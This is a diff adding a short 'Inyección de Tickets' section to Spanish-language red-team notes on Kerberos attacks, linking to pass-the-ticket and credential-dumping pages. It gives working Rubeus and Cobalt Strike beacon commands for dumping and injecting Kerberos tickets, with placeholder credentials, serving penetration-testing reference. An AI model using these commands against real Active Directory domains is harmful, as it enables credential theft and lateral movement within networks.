@@ -73,3 +73,16 @@ beacon> krb_dump /user:rsteel /service:krbtgt
 
 - [[04-lateral-movement/user-impersonation/pass-the-ticket|Pass The Ticket]] — inyectar tickets en contexto actual
 - [[03-post-explotacion/credential-access/os-credential-dumping|OS Credential Dumping]] — dump de hashes NTLM / credenciales
+
+## Inyección de Tickets
+
+```
+# Via Rubeus (crea proceso aislado, inyecta TGT)
+Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:corp.local /username:admin /password:FakePass /ticket:<base64_TGT>
+
+# Via Cobalt Strike
+beacon> make_token DOMAIN\user FakePass
+beacon> kerberos_ticket_use <ticket.kirbi>
+```
+
+→ Para Pass-the-Ticket completo: [[04-lateral-movement/user-impersonation/pass-the-ticket|Pass The Ticket]]
